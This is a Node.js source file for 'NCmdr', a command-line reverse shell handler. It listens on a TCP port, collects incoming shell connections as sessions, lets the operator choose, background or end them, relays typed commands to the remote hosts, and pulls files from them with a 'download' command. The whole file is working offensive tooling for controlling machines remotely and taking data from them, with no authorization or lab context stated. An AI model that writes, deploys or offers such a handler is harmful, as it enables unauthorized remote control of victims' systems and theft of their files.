#!/usr/bin/env node
import net from 'net';
import readline from 'readline';
import chalk from 'chalk';
import fs from 'fs';
import path from 'path';

class NCmdr {
    #bindaddr = '0.0.0.0';
    #port = 0;
    #rl;
    #sessions = [];
    #currentSessionId = null;

    static #RX_SESSION_SELECT = /sessions?(?: -i)? (\d+)/;
    static #RX_SESSION_KILL = /sessions? -k (\d+)/;
    static #RX_SESSION_EXIT = /exit ?(-y)?/;

    prompt() {
        return chalk.magenta('reverse_handler> ');
    }

    setPrompt() {
        this.#rl.setPrompt(this.prompt());
        this.#rl.prompt();
    }

    clearScreen() {
        process.stdout.write('\x1Bc'); // Clear screen
    }

    displayBanner() {
        console.log(chalk.cyan(`
   _   _  _____  _____   _____  ______  _____
  | \\ | ||  _  ||  __ \\ |_   _||  _  \\|  ___|
  |  \\| || | | || |  \\/   | |  | | | || |__
  | . \` || | | || | __    | |  | | | ||  __|
  | |\\  |\\ \\_/ /| |_\\ \\  _| |_ | |/ / | |___
  \\_| \\_/ \\___/  \\____/  \\___/ |___/  \\____/

  Reverse Shell Handler
`));
    }

    help() {
        console.log(chalk.yellow(
            `usage:
  ncmdr <port> [bindaddr]`
        ));
        process.exit(0);
    }

    async main() {
        this.clearScreen();
        this.displayBanner();
        const [,, port, bindaddr] = process.argv;
        if (port) {
            this.#port = parseInt(port, 10);
            if (isNaN(this.#port)) {
                this.#port = 0;
            }
        }
        if (bindaddr) {
            this.#bindaddr = bindaddr;
        }
        if (this.#port === 0) {
            this.help();
            process.exit(0);
        }

        this.#rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout,
            terminal: true,
            prompt: '',
        });
        process.on('SIGINT', this.onsigint.bind(this));
        this.#rl.on('line', this.oninput.bind(this));
        this.#rl.on('SIGINT', this.onsigint.bind(this));

        const server = net.createServer(this.accept.bind(this));
        server.on('error', this.onerror.bind(this));
        server.listen(this.#port, this.#bindaddr, () => this.listening(server));
    }

    onsigint() {
        const session = this.#sessions[this.#currentSessionId];
        if (session?.isOpen) {
            console.log(chalk.red(`Not currently possible to forward Ctrl+C. Sorry.`));
        } else {
            this.exit(false);
        }
    }

    exit(force) {
        const activeSessions = this.#sessions.filter(session => session.isOpen).length;
        if (activeSessions > 0 && !force) {
            this.printMessage(chalk.cyan(`You have ${activeSessions} active session(s). Type \`exit -y\` to force.`));
        } else {
            console.log('Bye');
            process.exit(0);
        }
    }

    printMessage(message) {
        process.stdout.write('\r\x1B[K'); // Clear current line
        console.log(message);
        this.#rl.prompt(true); // Redisplay prompt
    }

    listening(server) {
        const addr = server.address();
        this.printMessage(chalk.green(`[*] Listening on tcp://${addr.address}:${addr.port} ...`));
    }

    accept(socket) {
        const id = this.#sessions.length;
        const session = new Session(id, socket);
        this.#sessions.push(session);
        this.printMessage(chalk.green(`[*] New ${session.human}`));

        const push = (s) => {
            if (id === this.#currentSessionId) {
                this.printMessage(s);
            } else {
                session.buffer.push(Buffer.from(s));
            }
        };

        socket.on('data', (buf) => {
            if (id === this.#currentSessionId) {
                this.printMessage(buf.toString('utf-8'));
            } else {
                session.buffer.push(buf);
            }
        });
        socket.on('error', (err) => {
            push(`Socket ${id} error: ${err}`);
        });
        socket.on('timeout', () => {
            push(`[*] Session ${id} socket timeout.\n`);
            this.hangup(id);
        });
        socket.on('end', () => {
            push(`[*] Session ${id} remote client signaled socket end.\n`);
        });
        socket.on('close', () => {
            push(`[*] Session ${id} socket closed.\n`);
            this.hangup(id);
        });
    }

    async handleDownload(socket) {
        return new Promise((resolve, reject) => {
            let fileName = 'test-download';
            let fileStream = null;
            let fileNameReceived = false;

            socket.on('data', (chunk) => {
                if (!fileNameReceived) {
                    const fileNameEndIndex = chunk.indexOf('\n');
                    if (fileNameEndIndex !== -1) {
                        fileName = chunk.slice(0, fileNameEndIndex).toString('utf-8').trim();
                        const filePath = path.join('/root/ncmdr', path.basename(fileName));
                        try {
                            if (isDirectory(filePath)) {
                                reject(new Error(`The path ${filePath} is a directory, not a file`));
                            } else {
                                fileStream = fs.createWriteStream(filePath);
                                fileStream.on('error', (err) => reject(new Error(`File write error: ${err.message}`)));
                                fileStream.write(chunk.slice(fileNameEndIndex + 1));
                                fileNameReceived = true;
                            }
                        } catch (err) {
                            reject(new Error(`Failed to create file stream: ${err.message}`));
                        }
                    }
                } else {
                    if (fileStream) fileStream.write(chunk);
                }
            });

            socket.on('end', () => {
                if (fileStream) fileStream.end();
                resolve();
            });

            socket.on('error', (err) => {
                if (fileStream) fileStream.end();
                reject(new Error(`Socket error: ${err.message}`));
            });
        });
    }

    hangup(id) {
        const session = this.#sessions[id];
        if (session) {
            session.isOpen = false;
            try {
                session.socket.end();
            } catch (e) {
                // Handle potential errors when ending the socket
            }
        }
        if (id === this.#currentSessionId) {
            this.#currentSessionId = null;
            this.clearScreen();
            this.displayBanner();
            this.listActiveSessions();
        }
    }

    listActiveSessions() {
        const activeSessions = this.#sessions.filter(session => session.isOpen && !session.isDeleted);
        activeSessions.forEach(session => this.printMessage(chalk.green(`  ${session.toString()}`)));
        this.printMessage(chalk.cyan(`${activeSessions.length} active session(s) total.`));
    }

    onerror(err) {
        this.hangup(this.#currentSessionId);
        this.printMessage('Server Error: ' + err);
    }

    async oninput(line) {
        let m;
        if (this.#currentSessionId === null && line === 'help') {
            this.printMessage(chalk.yellow(`
  ls                  list active sessions
  ls -a               list all sessions
  session -i <ID>     select a session by id
  session -k <ID>     terminate a session by id
  background          send the current session to the background
  help                see this message
  exit                end process
`
            ));
        } else if (this.#currentSessionId === null && line === 'ls') {
            this.listActiveSessions();
        } else if (this.#currentSessionId === null && line === 'ls -a') {
            const allSessions = this.#sessions.filter(session => !session.isDeleted);
            allSessions.forEach(session => this.printMessage(chalk.green(`  ${session.toString()}`)));
            this.printMessage(chalk.cyan(`${allSessions.length} session(s) total.`));
        } else if (this.#currentSessionId === null && (m = line.match(NCmdr.#RX_SESSION_SELECT))) {
            const id = parseInt(m[1], 10);
            const session = this.#sessions[id];
            if (session?.isOpen) {
                this.clearScreen();
                this.#currentSessionId = id;
                this.printMessage(chalk.green(`Selected session ${id}`));
                if (session.buffer.length > 0) {
                    this.printMessage(Buffer.concat(session.buffer).toString('utf-8'));
                    session.buffer.length = 0;
                }
            } else {
                if (session?.buffer.length > 0) {
                    this.printMessage(Buffer.concat(session.buffer).toString('utf-8'));
                    session.buffer.length = 0;
                    session.isDeleted = true;
                } else {
                    this.printMessage('Invalid session ID!');
                }
            }
        } else if (this.#currentSessionId !== null && line === 'background') {
            this.clearScreen();
            this.displayBanner();
            this.#currentSessionId = null;
            this.listActiveSessions();
        } else if (this.#currentSessionId === null && (m = line.match(NCmdr.#RX_SESSION_KILL))) {
            const id = parseInt(m[1], 10);
            const session = this.#sessions[id];
            if (session) {
                this.printMessage(chalk.red(`Terminating session ${id}.`));
                this.hangup(id);
                session.isDeleted = true;
            }
        } else if (this.#currentSessionId === null && (m = line.match(NCmdr.#RX_SESSION_EXIT))) {
            const force = '-y' === m[1];
            this.exit(force);
        } else {
            const session = this.#sessions[this.#currentSessionId];
            if (!session?.isOpen) {
                this.printMessage(chalk.cyan('Please select a session.'));
            } else {
                if (line.startsWith('download ')) {
                    const filePath = line.split(' ')[1];
                    this.printMessage(chalk.cyan('Downloading...'));
                    session.socket.write(line + '\n');
                    try {
                        await this.handleDownload(session.socket);
                        this.printMessage(chalk.green('Done'));
                    } catch (err) {
                        this.printMessage(chalk.red(`Failed: ${err.message}`));
                    }
                } else {
                    session.socket.write(line + "\n");
                }
            }
        }
        this.setPrompt();
    }
}

class Session {
    id;
    socket;
    human;
    isOpen = true;
    isDeleted = false;
    buffer = [];

    constructor(id, socket) {
        this.id = id;
        this.socket = socket;
        this.human = `session ${`   ${this.id}`.substr(-3)} ${socket.localAddress}:${socket.localPort} <- ${socket.remoteAddress}:${socket.remotePort} at ${new Date().toISOString()}`;
    }

    toString() {
        return `${this.human} ${this.buffer.length < 1 ? 0 : Buffer.concat(this.buffer).length}B ${this.isOpen ? '' : chalk.red('(!)')}`;
    }
}

const isDirectory = (path) => {
    try {
        return fs.lstatSync(path).isDirectory();
    } catch (err) {
        return false;
    }
};

try {
    new NCmdr().main();
} catch (e) {
    console.error(e);
    process.exit(1);
}
